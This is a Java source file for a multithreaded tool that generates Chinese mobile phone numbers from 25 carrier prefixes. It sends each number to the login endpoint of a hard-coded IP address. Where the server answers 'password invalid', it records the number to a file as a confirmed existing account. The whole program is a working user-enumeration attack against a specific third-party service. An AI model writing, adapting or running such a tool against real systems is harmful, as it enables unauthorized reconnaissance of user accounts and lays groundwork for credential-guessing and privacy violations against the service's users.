package com.ericlin.mock.xqbz;

import java.io.IOException;

import com.qnvip.util.FileUtil;
import com.qnvip.util.HttpUtil;
import com.qnvip.util.StringUtil;

public class Xqbz extends Thread {
	
	private static String[] prefix = { "139", "138", "137", "136", "135", "134", "159", "158", "150", "151", "152",
			"157", "188", "187", "130", "131", "132", "156", "155", "186", "185", "133", "153", "189", "180" };
	
	public int index;
	
	public Xqbz(int index) {
		this.index = index;
	}
	// qinwin
	private static String url = "http://120.55.66.227:88/APPI_SCM_SAL_NET.asp?Action=login&UID=";

	@Override
	public void run() {
		for (int j = 1;  j < 99999999; j++) {
			String uid = prefix[index] + StringUtil.zeroFill(j, 8);
			String response = unicode2String(HttpUtil.doGet(url + uid, null));
			System.out.println(uid + response);
			if (response.indexOf("密码无效") >= 0) {
				try {
					FileUtil.write("e", "uid.txt", uid + "\r\n", true);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	public static void main(String[] args) {
		for (int i = 0; i < prefix.length; i++) {
			Xqbz t = new Xqbz(i);
			t.start();
		}
			
	}

	/**
	 * unicode 转字符串
	 */
	private static String unicode2String(String theString) {
		char aChar;
		int len = theString.length();
		StringBuffer outBuffer = new StringBuffer(len);
		for (int x = 0; x < len;) {
			aChar = theString.charAt(x++);
			if (aChar == '\\') {
				aChar = theString.charAt(x++);
				if (aChar == 'u') {
					// Read the xxxx
					int value = 0;
					for (int i = 0; i < 4; i++) {
						aChar = theString.charAt(x++);
						switch (aChar) {
						case '0':
						case '1':
						case '2':
						case '3':
						case '4':
						case '5':
						case '6':
						case '7':
						case '8':
						case '9':
							value = (value << 4) + aChar - '0';
							break;
						case 'a':
						case 'b':
						case 'c':
						case 'd':
						case 'e':
						case 'f':
							value = (value << 4) + 10 + aChar - 'a';
							break;
						case 'A':
						case 'B':
						case 'C':
						case 'D':
						case 'E':
						case 'F':
							value = (value << 4) + 10 + aChar - 'A';
							break;
						default:
							throw new IllegalArgumentException("Malformed   \\uxxxx   encoding.");
						}
					}
					outBuffer.append((char) value);
				} else {
					if (aChar == 't')
						aChar = '\t';
					else if (aChar == 'r')
						aChar = '\r';
					else if (aChar == 'n')
						aChar = '\n';
					else if (aChar == 'f')
						aChar = '\f';
					outBuffer.append(aChar);
				}
			} else
				outBuffer.append(aChar);
		}
		return outBuffer.toString();
	}
}
